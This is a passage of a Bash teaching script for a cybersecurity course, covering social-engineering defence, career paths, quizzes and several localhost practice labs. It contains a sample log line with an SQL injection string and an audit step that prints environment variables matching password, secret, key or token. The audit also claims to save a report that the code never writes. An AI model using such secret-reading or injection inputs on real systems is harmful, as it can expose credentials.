        "🐳 WHALING|Targeting high-profile executives (CEO, CFO)"
        "📞 VISHING|Voice phishing - phone calls pretending to be banks/IT support"
        "📱 SMISHING|SMS phishing - fake text messages with malicious links"
        "🎭 PRETEXTING|Creating fabricated scenario to manipulate victim"
        "🍬 BAITING|Leaving infected USB drives in parking lots"
        "🔄 QUID PRO QUO|Offering service in exchange for information"
        "🚪 TAILGATING|Following authorized person into secure area"
        "🗑️ DUMPSTER DIVING|Searching trash for sensitive information"
        "🌊 WATERING HOLE|Infecting sites frequently visited by targets"
        "💕 ROMANCE SCAM|Building fake relationship to extract money/info"
    )
    
    for attack in "${se_attacks[@]}"; do
        IFS='|' read -r name description <<< "$attack"
        echo -e "${RED}$name${NC}"
        echo -e "   ${WHITE}$description${NC}"
        echo ""
    done
    
    press_enter
    
    # Lesson 9.3 - Phishing Deep Dive
    clear_screen
    echo -e "${YELLOW}📖 LESSON 9.3: Identifying Phishing Emails${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
HOW TO SPOT A PHISHING EMAIL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RED FLAGS TO LOOK FOR:
━━━━━━━━━━━━━━━━━━━━━━
  ❌ Urgency or threats ("Act NOW or account closed!")
  ❌ Generic greetings ("Dear Customer")
  ❌ Suspicious sender email address
     (support@paypa1.com vs paypal.com)
  ❌ Spelling and grammar errors
  ❌ Mismatched URLs (hover over links!)
  ❌ Unexpected attachments
  ❌ Requests for sensitive information
  ❌ Too-good-to-be-true offers
  ❌ Strange characters in domain (paypaI.com)
  ❌ Non-standard TLDs (.ru, .cn, .tk)

HOVER TECHNIQUE:
━━━━━━━━━━━━━━━━
  Always hover over links to see actual URL
  Display URL ≠ Actual URL in emails!
  
  Example:
  Display: https://paypal.com/secure
  Actual:  https://pay-pal.evil.com/steal

EMAIL HEADERS TO CHECK:
━━━━━━━━━━━━━━━━━━━━━━━
  From:     - Check actual email domain
  Reply-To: - Different from From? Suspicious!
  Return-Path: - Where bounces go
  SPF/DKIM/DMARC - Email authentication

REPORTING PHISHING:
━━━━━━━━━━━━━━━━━━━
  → Forward to phishing@organization.com
  → Report to anti-phishing authorities
  → Report to actual company being impersonated
  → Google: report phishing page
  → APWG: reportphishing@apwg.org
LESSON
    
    press_enter
    
    # Lesson 9.4 - Defense
    clear_screen
    echo -e "${YELLOW}📖 LESSON 9.4: Defending Against Social Engineering${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
PERSONAL DEFENSE:
━━━━━━━━━━━━━━━━━
  ✅ Verify caller identity before sharing info
  ✅ Call back on official numbers, not provided ones
  ✅ Never share passwords, even with "IT"
  ✅ Question urgency - legitimate requests aren't urgent
  ✅ Verify requests through separate channel
  ✅ Trust your instincts - if something feels off, verify
  ✅ Never click links in emails - go directly to site
  ✅ Enable MFA on all important accounts
  ✅ Use unique email addresses for different purposes

ORGANIZATIONAL DEFENSE:
━━━━━━━━━━━━━━━━━━━━━━━
  ✅ Regular security awareness training
  ✅ Phishing simulation campaigns
  ✅ Clear security policies
  ✅ Verification procedures for sensitive requests
  ✅ Report and reward system for reporting attacks
  ✅ Email filtering and anti-phishing tools
  ✅ Multi-factor authentication everywhere
  ✅ Incident response procedures

THE GOLDEN RULE:
━━━━━━━━━━━━━━━━
  "VERIFY, then TRUST"
  
  Never give information to someone who contacts YOU.
  Always initiate contact through official channels.

REMEMBER:
  🏦 Banks NEVER ask for your password
  💻 IT NEVER needs your password
  🔒 Legitimate companies don't demand immediate action
  📧 Links in emails can be faked
LESSON
    
    press_enter
    
    # Module 9 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 9 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What is targeted phishing against executives called?" \
        "whaling" \
        "Big fish = whale"
    
    ask_question \
        "Which social engineering leaves infected USBs in parking lots?" \
        "baiting" \
        "Like bait for fish"
    
    ask_question \
        "What is phishing via SMS called?" \
        "smishing" \
        "SMS + phishing"
    
    ask_question \
        "What is the golden rule of social engineering defense?" \
        "verify then trust" \
        "Always verify before sharing info"
    
    show_quiz_result
    save_progress "MODULE_9"
    press_enter
}

# ============================================
# MODULE 10: CAREER & CERTIFICATIONS
# ============================================

module_10_career() {
    clear_screen
    draw_box "MODULE 10: CYBERSECURITY CAREER PATH"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Cybersecurity career paths"
    echo -e "  ${GREEN}►${NC} Important certifications"
    echo -e "  ${GREEN}►${NC} Building a home lab"
    echo -e "  ${GREEN}►${NC} Resources for learning"
    press_enter
    
    # Lesson 10.1 - Career Paths
    clear_screen
    echo -e "${YELLOW}📖 LESSON 10.1: Cybersecurity Career Paths${NC}"
    draw_line "-" 60
    echo ""
    
    careers=(
        "🔴 RED TEAM / OFFENSIVE|Penetration Tester, Ethical Hacker, Bug Hunter|$70k-$150k+"
        "🔵 BLUE TEAM / DEFENSIVE|SOC Analyst, Incident Responder, Threat Hunter|$60k-$130k+"
        "🟣 PURPLE TEAM|Combines red and blue team skills|$80k-$160k+"
        "🌐 NETWORK SECURITY|Network Security Engineer, Firewall Admin|$70k-$140k+"
        "🔐 CRYPTOGRAPHY|Crypto Engineer, Security Architect|$100k-$200k+"
        "☁️ CLOUD SECURITY|Cloud Security Engineer, AWS/Azure Security|$90k-$180k+"
        "📱 APPLICATION SEC|AppSec Engineer, DevSecOps, Code Reviewer|$85k-$160k+"
        "🕵️ MALWARE ANALYST|Reverse Engineer, Malware Researcher|$80k-$150k+"
        "🏛️ GOVERNANCE|CISO, Risk Manager, Compliance Analyst|$80k-$250k+"
        "🔬 DIGITAL FORENSICS|Forensic Analyst, Incident Investigator|$65k-$130k+"
    )
    
    for career in "${careers[@]}"; do
        IFS='|' read -r title description salary <<< "$career"
        echo -e "${CYAN}$title${NC}"
        echo -e "   Roles: ${WHITE}$description${NC}"
        echo -e "   Salary: ${GREEN}$salary${NC}"
        echo ""
    done
    
    press_enter
    
    # Lesson 10.2 - Certifications
    clear_screen
    echo -e "${YELLOW}📖 LESSON 10.2: Cybersecurity Certifications${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${CYAN}BEGINNER LEVEL:${NC}"
    echo -e "${GREEN}CompTIA Security+${NC}"
    echo -e "   Best entry-level cert | Cost: ~\$370 | DoD 8570 approved"
    echo ""
    echo -e "${GREEN}CompTIA Network+${NC}"
    echo -e "   Networking fundamentals | Cost: ~\$338 | Take before Security+"
    echo ""
    echo -e "${GREEN}CompTIA A+${NC}"
    echo -e "   IT fundamentals | Cost: ~\$226 | Start here if new to IT"
    echo ""
    
    echo -e "${CYAN}INTERMEDIATE LEVEL:${NC}"
    echo -e "${YELLOW}CEH - Certified Ethical Hacker${NC}"
    echo -e "   EC-Council | Cost: ~\$950 | Good for beginners in hacking"
    echo ""
    echo -e "${YELLOW}eJPT - Junior Penetration Tester${NC}"
    echo -e "   eLearnSecurity | Cost: ~\$200 | Great practical cert"
    echo ""
    echo -e "${YELLOW}CompTIA CySA+${NC}"
    echo -e "   Security analyst skills | Cost: ~\$370 | Blue team focused"
    echo ""
    
    echo -e "${CYAN}ADVANCED LEVEL:${NC}"
    echo -e "${RED}OSCP - Offensive Security Certified Professional${NC}"
    echo -e "   Gold standard for pentesters | Cost: ~\$1499 | Very hard"
    echo ""
    echo -e "${RED}CISSP - Certified Info Security Professional${NC}"
    echo -e "   (ISC)² | Cost: ~\$749 | Management level | 5yr experience"
    echo ""
    echo -e "${RED}GPEN / GWAPT / GREM${NC}"
    echo -e "   SANS GIAC certs | Cost: ~\$2000+ | Elite technical certs"
    echo ""
    
    echo -e "${CYAN}VENDOR SPECIFIC:${NC}"
    echo -e "${BLUE}AWS Security Specialty${NC} | Azure Security Engineer | GCP Security"
    echo -e "${BLUE}Cisco CCNA Security${NC} | Palo Alto PCNSE | Fortinet NSE"
    
    press_enter
    
    # Lesson 10.3 - Home Lab
    clear_screen
    echo -e "${YELLOW}📖 LESSON 10.3: Building a Cybersecurity Home Lab${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
VIRTUAL HOME LAB SETUP:
━━━━━━━━━━━━━━━━━━━━━━━

VIRTUALIZATION SOFTWARE (FREE):
  • VirtualBox - https://virtualbox.org
  • VMware Workstation Player - Free for personal
  • Proxmox - Free enterprise hypervisor

ATTACKER MACHINES:
  • Kali Linux - Primary penetration testing distro
  • Parrot OS - Lightweight alternative to Kali
  • BlackArch - Arch-based security distro

VULNERABLE TARGET MACHINES:
  • Metasploitable 2/3 - Intentionally vulnerable
  • DVWA (Damn Vulnerable Web App)
  • VulnHub - Download vulnerable VMs
  • HackTheBox - Online labs (easy start)
  • TryHackMe - Guided learning labs

NETWORK SIMULATION:
  • GNS3 - Network emulation
  • EVE-NG - Network lab platform
  • Cisco Packet Tracer - Network learning

ONLINE PRACTICE PLATFORMS:
━━━━━━━━━━━━━━━━━━━━━━━━━━
  🎯 TryHackMe.com    - Beginner friendly
  🎯 HackTheBox.com   - Intermediate/Advanced
  🎯 PentesterLab     - Web security focus
  🎯 VulnHub.com      - Download VM challenges
  🎯 PortSwigger WebAcademy - Free web hacking
  🎯 PicoCTF          - CTF for beginners
  🎯 CTFtime.org      - CTF competitions

PRACTICE SAFELY IN TERMUX:
━━━━━━━━━━━━━━━━━━━━━━━━━━
  • Test commands on localhost only
  • Create test files and networks
  • Use intentionally vulnerable apps
  • Write scripts and tools
  • Learn programming (Python, Bash)
LESSON
    
    press_enter
    
    # Lesson 10.4 - Resources
    clear_screen
    echo -e "${YELLOW}📖 LESSON 10.4: Learning Resources${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${CYAN}📚 BOOKS:${NC}"
    books=(
        "The Web Application Hacker's Handbook - Stuttard & Pinto"
        "Penetration Testing - Georgia Weidman"
        "Hacking: The Art of Exploitation - Jon Erickson"
        "The Art of Invisibility - Kevin Mitnick"
        "Blue Team Handbook - Don Murdoch"
        "RTFM: Red Team Field Manual"
        "CompTIA Security+ Study Guide - Mike Chapple"
    )
    
    for book in "${books[@]}"; do
        echo -e "  ${GREEN}📖${NC} $book"
    done
    
    echo ""
    echo -e "${CYAN}🌐 WEBSITES:${NC}"
    websites=(
        "OWASP.org - Web security knowledge base"
        "SANS.org - Professional cybersecurity training"
        "Exploit-db.com - Exploit database"
        "CVEdetails.com - Vulnerability database"
        "Shodan.io - Internet-connected device search"
        "VirusTotal.com - File/URL malware scanning"
        "PacketStorm.com - Security tools and exploits"
        "NVD.NIST.gov - National vulnerability database"
    )
    
    for site in "${websites[@]}"; do
        echo -e "  ${BLUE}🌐${NC} $site"
    done
    
    echo ""
    echo -e "${CYAN}🎥 FREE COURSES:${NC}"
    courses=(
        "Cybrary.it - Free security courses"
        "TCM Security Academy - Practical courses"
        "Professor Messer - CompTIA prep"
        "IppSec YouTube - HackTheBox walkthroughs"
        "John Hammond YouTube - CTF and security"
        "NetworkChuck YouTube - Networking & security"
        "David Bombal YouTube - Ethical hacking"
    )
    
    for course in "${courses[@]}"; do
        echo -e "  ${YELLOW}🎥${NC} $course"
    done
    
    press_enter
    
    # Module 10 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 10 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What is considered the gold standard penetration testing cert?" \
        "oscp" \
        "Offensive Security Certified ___"
    
    ask_question \
        "Which free virtualization software is good for home labs?" \
        "virtualbox" \
        "Oracle's free hypervisor"
    
    ask_question \
        "What is the best beginner-friendly online hacking platform?" \
        "tryhackme" \
        "Guided learning with rooms"
    
    ask_question \
        "What is the entry-level CompTIA security certification?" \
        "security+" \
        "CompTIA Sec..."
    
    show_quiz_result
    save_progress "MODULE_10"
    press_enter
}

# ============================================
# PRACTICE LAB
# ============================================

practice_lab() {
    clear_screen
    draw_box "HANDS-ON PRACTICE LAB"
    
    echo -e "${CYAN}Choose a practice lab:${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Password Strength Checker"
    echo -e "${GREEN}2.${NC} Hash Generator"
    echo -e "${GREEN}3.${NC} Network Scanner (localhost only)"
    echo -e "${GREEN}4.${NC} System Security Audit"
    echo -e "${GREEN}5.${NC} Base64 Encoder/Decoder"
    echo -e "${GREEN}6.${NC} Log Analyzer"
    echo -e "${GREEN}7.${NC} File Integrity Checker"
    echo -e "${GREEN}8.${NC} Back to Main Menu"
    echo ""
    echo -n -e "${YELLOW}Select lab [1-8]: ${NC}"
    read -r lab_choice
    
    case "$lab_choice" in
        1) lab_password_checker ;;
        2) lab_hash_generator ;;
        3) lab_network_scanner ;;
        4) lab_security_audit ;;
        5) lab_base64 ;;
        6) lab_log_analyzer ;;
        7) lab_file_integrity ;;
        8) return ;;
        *) echo -e "${RED}Invalid choice${NC}" ;;
    esac
}

lab_password_checker() {
    clear_screen
    echo -e "${CYAN}🔐 PASSWORD STRENGTH CHECKER${NC}"
    draw_line "-" 60
    echo ""
    echo -n "Enter a password to check: "
    read -rs password
    echo ""
    echo ""
    
    local score=0
    local feedback=""
    
    local length=${#password}
    
    echo -e "${CYAN}Analysis:${NC}"
    
    if [ "$length" -lt 8 ]; then
        echo -e "  ${RED}✗${NC} Length: $length chars (Too short!)"
    elif [ "$length" -lt 12 ]; then
        echo -e "  ${YELLOW}~${NC} Length: $length chars (Acceptable)"
        score=$((score + 1))
    elif [ "$length" -lt 16 ]; then
        echo -e "  ${GREEN}✓${NC} Length: $length chars (Good)"
        score=$((score + 2))
    else
        echo -e "  ${GREEN}✓✓${NC} Length: $length chars (Excellent!)"
        score=$((score + 3))
    fi
    
    if echo "$password" | grep -q '[a-z]'; then
        echo -e "  ${GREEN}✓${NC} Contains lowercase letters"
        score=$((score + 1))
    else
        echo -e "  ${RED}✗${NC} No lowercase letters"
    fi
    
    if echo "$password" | grep -q '[A-Z]'; then
        echo -e "  ${GREEN}✓${NC} Contains uppercase letters"
        score=$((score + 1))
    else
        echo -e "  ${RED}✗${NC} No uppercase letters"
    fi
    
    if echo "$password" | grep -q '[0-9]'; then
        echo -e "  ${GREEN}✓${NC} Contains numbers"
        score=$((score + 1))
    else
        echo -e "  ${RED}✗${NC} No numbers"
    fi
    
    if echo "$password" | grep -q '[!@#$%^&*()_+\-=\[\]{};:,.<>?]'; then
        echo -e "  ${GREEN}✓${NC} Contains special characters"
        score=$((score + 2))
    else
        echo -e "  ${RED}✗${NC} No special characters"
    fi
    
    common_passwords=("password" "123456" "qwerty" "admin" "letmein" "welcome")
    password_lower=$(echo "$password" | tr '[:upper:]' '[:lower:]')
    for common in "${common_passwords[@]}"; do
        if [ "$password_lower" = "$common" ]; then
            echo -e "  ${RED}✗✗ COMMON PASSWORD DETECTED!${NC}"
            score=0
        fi
    done
    
    echo ""
    echo -e "${CYAN}Strength Score: $score/9${NC}"
    
    if [ "$score" -le 2 ]; then
        echo -e "${RED}⚠️  VERY WEAK - Change immediately!${NC}"
    elif [ "$score" -le 4 ]; then
        echo -e "${RED}😟 WEAK - Needs improvement${NC}"
    elif [ "$score" -le 6 ]; then
        echo -e "${YELLOW}😐 MODERATE - Could be better${NC}"
    elif [ "$score" -le 8 ]; then
        echo -e "${GREEN}😊 STRONG - Good password!${NC}"
    else
        echo -e "${GREEN}🏆 VERY STRONG - Excellent!${NC}"
    fi
    
    echo ""
    echo -e "${CYAN}Password Hash (SHA256):${NC}"
    echo "$password" | sha256sum | cut -d' ' -f1
    
    press_enter
}

lab_hash_generator() {
    clear_screen
    echo -e "${CYAN}#️⃣ HASH GENERATOR${NC}"
    draw_line "-" 60
    echo ""
    echo -n "Enter text to hash: "
    read -r text
    echo ""
    
    echo -e "${CYAN}Generating hashes for: ${WHITE}$text${NC}"
    echo ""
    
    echo -e "${YELLOW}MD5:${NC}"
    echo -e "  $(echo -n "$text" | md5sum | cut -d' ' -f1)"
    
    echo -e "${YELLOW}SHA-1:${NC}"
    echo -e "  $(echo -n "$text" | sha1sum | cut -d' ' -f1)"
    
    echo -e "${YELLOW}SHA-224:${NC}"
    echo -e "  $(echo -n "$text" | sha224sum | cut -d' ' -f1)"
    
    echo -e "${YELLOW}SHA-256:${NC}"
    echo -e "  $(echo -n "$text" | sha256sum | cut -d' ' -f1)"
    
    echo -e "${YELLOW}SHA-384:${NC}"
    echo -e "  $(echo -n "$text" | sha384sum | cut -d' ' -f1)"
    
    echo -e "${YELLOW}SHA-512:${NC}"
    echo -e "  $(echo -n "$text" | sha512sum | cut -d' ' -f1)"
    
    echo ""
    echo -e "${CYAN}Base64 Encoding:${NC}"
    echo -e "  $(echo -n "$text" | base64)"
    
    echo ""
    echo -e "${GREEN}Note: Changing even one character changes the entire hash!${NC}"
    echo -e "${YELLOW}Modified text ('${text}1'):${NC}"
    echo -e "  SHA-256: $(echo -n "${text}1" | sha256sum | cut -d' ' -f1)"
    
    press_enter
}

lab_network_scanner() {
    clear_screen
    echo -e "${CYAN}🔍 NETWORK SCANNER (Localhost Only)${NC}"
    draw_line "-" 60
    echo -e "${RED}⚠️  Only scanning localhost for educational purposes${NC}"
    echo ""
    
    echo -e "${YELLOW}Checking common ports on localhost...${NC}"
    echo ""
    
    common_ports=(21 22 23 25 53 80 110 143 443 3306 3389 5432 8080 8443 9090)
    
    echo -e "${CYAN}Port    Status    Service${NC}"
    draw_line "-" 40
    
    for port in "${common_ports[@]}"; do
        if (echo >/dev/tcp/localhost/$port) 2>/dev/null; then
            service=""
            case $port in
                21) service="FTP" ;;
                22) service="SSH" ;;
                23) service="Telnet" ;;
                25) service="SMTP" ;;
                53) service="DNS" ;;
                80) service="HTTP" ;;
                110) service="POP3" ;;
                143) service="IMAP" ;;
                443) service="HTTPS" ;;
                3306) service="MySQL" ;;
                3389) service="RDP" ;;
                5432) service="PostgreSQL" ;;
                8080) service="HTTP-Alt" ;;
                8443) service="HTTPS-Alt" ;;
                9090) service="Custom" ;;
            esac
            echo -e "${port}     ${GREEN}OPEN${NC}      $service"
        else
            :
        fi
    done
    
    echo ""
    echo -e "${YELLOW}Using nmap if available...${NC}"
    if command -v nmap &>/dev/null; then
        nmap -sT -p 1-1000 localhost 2>/dev/null | grep "open"
    else
        echo -e "${RED}nmap not installed. Install: pkg install nmap${NC}"
    fi
    
    press_enter
}

lab_security_audit() {
    clear_screen
    echo -e "${CYAN}🔒 SYSTEM SECURITY AUDIT${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${YELLOW}Running security checks...${NC}"
    echo ""
    
    echo -e "${CYAN}[1/8] System Information${NC}"
    echo -e "  OS: $(uname -s) $(uname -r)"
    echo -e "  User: $(whoami)"
    echo -e "  Shell: $SHELL"
    echo ""
    
    echo -e "${CYAN}[2/8] Checking for open ports${NC}"
    if command -v netstat &>/dev/null; then
        OPEN_PORTS=$(netstat -tulpn 2>/dev/null | grep LISTEN | wc -l)
        echo -e "  Open listening ports: $OPEN_PORTS"
    elif command -v ss &>/dev/null; then
        OPEN_PORTS=$(ss -tulpn 2>/dev/null | grep LISTEN | wc -l)
        echo -e "  Open listening ports: $OPEN_PORTS"
    else
        echo -e "  ${RED}Cannot check ports (netstat/ss not available)${NC}"
    fi
    echo ""
    
    echo -e "${CYAN}[3/8] Checking SSH configuration${NC}"
    if [ -f /etc/ssh/sshd_config ]; then
        ROOT_LOGIN=$(grep "PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null)
        PASS_AUTH=$(grep "PasswordAuthentication" /etc/ssh/sshd_config 2>/dev/null)
        echo -e "  $ROOT_LOGIN"
        echo -e "  $PASS_AUTH"
    else
        echo -e "  ${YELLOW}SSH not configured or not accessible${NC}"
    fi
    echo ""
    
    echo -e "${CYAN}[4/8] Checking file permissions${NC}"
    if [ -f /etc/passwd ]; then
        PASSWD_PERM=$(stat -c "%a" /etc/passwd 2>/dev/null)
        echo -e "  /etc/passwd: $PASSWD_PERM (should be 644)"
    fi
    
    if [ -f /etc/shadow ]; then
        SHADOW_PERM=$(stat -c "%a" /etc/shadow 2>/dev/null)
        echo -e "  /etc/shadow: $SHADOW_PERM (should be 640)"
    fi
    echo ""
    
    echo -e "${CYAN}[5/8] Checking running processes${NC}"
    PROC_COUNT=$(ps aux 2>/dev/null | wc -l)
    echo -e "  Running processes: $PROC_COUNT"
    echo ""
    
    echo -e "${CYAN}[6/8] Disk space check${NC}"
    df -h 2>/dev/null | head -5 || echo "  df not available"
    echo ""
    
    echo -e "${CYAN}[7/8] Memory usage${NC}"
    free -h 2>/dev/null | head -3 || echo "  free not available"
    echo ""
    
    echo -e "${CYAN}[8/8] Environment variables (sensitive)${NC}"
    env 2>/dev/null | grep -i "pass\|secret\|key\|token\|api" | head -5 || echo "  No sensitive env vars found"
    
    echo ""
    draw_line "=" 60
    echo -e "${GREEN}✅ Security audit complete!${NC}"
    echo -e "Report saved to: $COURSE_DIR/labs/audit_$(date '+%Y%m%d_%H%M%S').txt"
    
    press_enter
}

lab_base64() {
    clear_screen
    echo -e "${CYAN}🔄 BASE64 ENCODER/DECODER${NC}"
    draw_line "-" 60
    echo ""
    echo -e "${GREEN}1.${NC} Encode text"
    echo -e "${GREEN}2.${NC} Decode base64"
    echo -e "${GREEN}3.${NC} Encode file"
    echo ""
    echo -n "Choose [1-3]: "
    read -r choice
    
    case "$choice" in
        1)
            echo -n "Enter text to encode: "
            read -r text
            echo ""
            ENCODED=$(echo -n "$text" | base64)
            echo -e "${CYAN}Original:${NC} $text"
            echo -e "${GREEN}Base64:${NC}   $ENCODED"
            ;;
        2)
            echo -n "Enter base64 to decode: "
            read -r b64
            echo ""
            DECODED=$(echo "$b64" | base64 -d 2>/dev/null)
            if [ $? -eq 0 ]; then
                echo -e "${CYAN}Base64:${NC}   $b64"
                echo -e "${GREEN}Decoded:${NC}  $DECODED"
            else
                echo -e "${RED}Invalid base64 string!${NC}"
            fi
            ;;
        3)
            echo -n "Enter file path: "
            read -r filepath
            if [ -f "$filepath" ]; then
                ENCODED=$(base64 "$filepath")
                echo -e "${GREEN}File encoded to base64:${NC}"
                echo "$ENCODED" | head -5
                echo "..."
                echo "$ENCODED" > "${filepath}.b64"
                echo -e "${GREEN}Saved to: ${filepath}.b64${NC}"
            else
                echo -e "${RED}File not found!${NC}"
            fi
            ;;
    esac
    
    press_enter
}

lab_log_analyzer() {
    clear_screen
    echo -e "${CYAN}📋 LOG ANALYZER${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${YELLOW}Creating sample log file for analysis...${NC}"
    
    cat > "$COURSE_DIR/labs/sample.log" << 'LOGFILE'
2024-01-15 08:23:11 INFO User admin logged in from 192.168.1.100
2024-01-15 08:24:01 INFO File accessed: /etc/config.txt
2024-01-15 08:25:30 WARNING Failed login attempt for user root from 10.0.0.5
2024-01-15 08:25:31 WARNING Failed login attempt for user root from 10.0.0.5
2024-01-15 08:25:32 WARNING Failed login attempt for user root from 10.0.0.5
2024-01-15 08:25:33 WARNING Failed login attempt for user root from 10.0.0.5
2024-01-15 08:25:34 WARNING Failed login attempt for user root from 10.0.0.5
2024-01-15 08:30:00 ERROR SQL Error in login form: syntax error
2024-01-15 08:30:01 ERROR SQL Error: unexpected ' character in input
2024-01-15 08:31:00 INFO User john logged in from 192.168.1.50
2024-01-15 08:32:15 WARNING Unusual port scan detected from 172.16.0.200
2024-01-15 08:33:00 CRITICAL Unauthorized access attempt to /admin/
2024-01-15 08:34:00 INFO System backup completed successfully
2024-01-15 08:35:00 WARNING User bob failed login 3 times
2024-01-15 09:00:00 INFO Scheduled maintenance task completed
2024-01-15 09:15:00 CRITICAL Possible SQL injection detected: ' OR 1=1
2024-01-15 09:16:00 ERROR File permission denied: /etc/shadow
2024-01-15 09:20:00 WARNING Scanning from external IP: 203.0.113.42
LOGFILE
    
    echo -e "${GREEN}Sample log created. Analyzing...${NC}"
    echo ""
    
    LOG_FILE="$COURSE_DIR/labs/sample.log"
    
    echo -e "${CYAN}=== LOG ANALYSIS REPORT ===${NC}"
    echo -e "File: $LOG_FILE"
    echo -e "Date: $(date)"
    echo ""
    
    echo -e "${CYAN}Total Log Entries:${NC} $(wc -l < "$LOG_FILE")"
    echo -e "${GREEN}INFO Events:${NC}     $(grep -c "INFO" "$LOG_FILE")"
    echo -e "${YELLOW}WARNING Events:${NC}  $(grep -c "WARNING" "$LOG_FILE")"
    echo -e "${RED}ERROR Events:${NC}    $(grep -c "ERROR" "$LOG_FILE")"
    echo -e "${RED}CRITICAL Events:${NC} $(grep -c "CRITICAL" "$LOG_FILE")"
    echo ""
    
    echo -e "${RED}🚨 SECURITY ALERTS:${NC}"
    echo ""
    
    FAILED_LOGINS=$(grep -c "Failed login" "$LOG_FILE")
    echo -e "${YELLOW}Failed Login Attempts: $FAILED_LOGINS${NC}"
    grep "Failed login" "$LOG_FILE" | while IFS= read -r line; do
        echo -e "  ${RED}→${NC} $line"
    done
    echo ""
    
    SQL_ATTEMPTS=$(grep -c "SQL" "$LOG_FILE")
    echo -e "${YELLOW}SQL Related Events: $SQL_ATTEMPTS${NC}"
    grep "SQL" "$LOG_FILE" | while IFS= read -r line; do
        echo -e "  ${RED}→${NC} $line"
    done
    echo ""
    
    echo -e "${YELLOW}Critical Events:${NC}"
    grep "CRITICAL" "$LOG_FILE" | while IFS= read -r line; do
        echo -e "  ${RED}→${NC} $line"
    done
    echo ""
    
    echo -e "${YELLOW}Port Scanning Detected:${NC}"
    grep "scan" "$LOG_FILE" | while IFS= read -r line; do
        echo -e "  ${RED}→${NC} $line"
    done
    
    press_enter
}

lab_file_integrity() {
    clear_screen
    echo -e "${CYAN}🔒 FILE INTEGRITY CHECKER${NC}"
    draw_line "-" 60
    echo ""
    
    INTEGRITY_DIR="$COURSE_DIR/labs/integrity"
    HASH_DB="$COURSE_DIR/labs/integrity/hashes.db"
    
    mkdir -p "$INTEGRITY_DIR"
    
    echo -e "${CYAN}Creating test files...${NC}"
    echo "This is an important configuration file" > "$INTEGRITY_DIR/config.txt"
    echo "SECRET_KEY=abc123" > "$INTEGRITY_DIR/secrets.txt"
    echo "admin:password123" > "$INTEGRITY_DIR/users.txt"
    
    echo -e "${YELLOW}Generating file integrity hashes...${NC}"
    echo ""
    
    echo "# File Integrity Database - $(date)" > "$HASH_DB"
    echo "# Format: SHA256_HASH  FILENAME" >> "$HASH_DB"
    
    for file in "$INTEGRITY_DIR"/*.txt; do
        HASH=$(sha256sum "$file" | cut -d' ' -f1)
        FILENAME=$(basename "$file")
        echo "$HASH  $FILENAME" >> "$HASH_DB"
        echo -e "${GREEN}✓${NC} $FILENAME"
        echo -e "  Hash: ${YELLOW}$HASH${NC}"
        echo ""
    done
    
    echo -e "${CYAN}Hash database created: $HASH_DB${NC}"
    echo ""
    echo -e "${YELLOW}Now modifying a file to simulate tampering...${NC}"
    echo "MODIFIED CONTENT - TAMPERED!" >> "$INTEGRITY_DIR/config.txt"
    echo ""
    
    echo -e "${CYAN}Checking file integrity...${NC}"
    echo ""
    
    while IFS= read -r line; do
        if [[ "$line" == "#"* ]] || [[ -z "$line" ]]; then
            continue
        fi
        
        STORED_HASH=$(echo "$line" | awk '{print $1}')
        FILENAME=$(echo "$line" | awk '{print $2}')
        FILEPATH="$INTEGRITY_DIR/$FILENAME"
        
        if [ -f "$FILEPATH" ]; then
            CURRENT_HASH=$(sha256sum "$FILEPATH" | cut -d' ' -f1)
            
            if [ "$STORED_HASH" = "$CURRENT_HASH" ]; then
                echo -e "${GREEN}✅ INTACT:${NC} $FILENAME"
            else
                echo -e "${RED}⚠️  MODIFIED: $FILENAME${NC}"
                echo -e "   Stored:  $STORED_HASH"
                echo -e "   Current: $CURRENT_HASH"
            fi
        else
            echo -e "${RED}❌ MISSING: $FILENAME${NC}"
        fi
    done < "$HASH_DB"
    
    echo ""
    echo -e "${CYAN}File integrity check complete!${NC}"
    
    press_enter
}

# ============================================
# NOTES SYSTEM
# ============================================

notes_menu() {
    while true; do
        clear_screen
        draw_box "NOTES SYSTEM"
        
        echo -e "${GREEN}1.${NC} View my notes"
        echo -e "${GREEN}2.${NC} Add a new note"
        echo -e "${GREEN}3.${NC} Search notes"
        echo -e "${GREEN}4.${NC} Export notes"
        echo -e "${GREEN}5.${NC} Back to main menu"
        echo ""
        echo -n -e "${YELLOW}Choose [1-5]: ${NC}"
        read -r choice
        
        case "$choice" in
            1)
                clear_screen
                echo -e "${CYAN}📝 MY NOTES${NC}"
                draw_line "-" 60
                cat "$NOTES_FILE"
                press_enter
                ;;
            2)
                echo -n "Enter your note: "
                read -r note
                add_note "$note"
                press_enter
                ;;
            3)
                echo -n "Search for: "
                read -r search
                clear_screen
                echo -e "${CYAN}Search results for: $search${NC}"
                draw_line "-" 60
                grep -n "$search" "$NOTES_FILE" || echo "No results found"
                press_enter
                ;;
            4)
                echo -e "${GREEN}Notes exported to: $NOTES_FILE${NC}"
                echo "Backup created: ${NOTES_FILE}.backup"
                cp "$NOTES_FILE" "${NOTES_FILE}.backup"
                press_enter
                ;;
            5) return ;;
        esac
    done
}

# ============================================
# PROGRESS TRACKER
# ============================================

show_progress() {
    clear_screen
    draw_box "MY PROGRESS"
    
    echo -e "${CYAN}Student: ${WHITE}$STUDENT_NAME${NC}"
    echo -e "${CYAN}Date: ${WHITE}$(date)${NC}"
    echo ""
    
    modules=(
        "MODULE_1|Introduction to Cybersecurity"
        "MODULE_2|Networking Fundamentals"
        "MODULE_3|Linux Security Basics"
        "MODULE_4|Cryptography"
        "MODULE_5|Web Application Security"
        "MODULE_6|Network Attacks & Defense"
        "MODULE_7|Penetration Testing Basics"
        "MODULE_8|Malware Analysis & Defense"
        "MODULE_9|Social Engineering"
        "MODULE_10|Career & Certifications"
    )
    
    completed=0
    total=${#modules[@]}
    
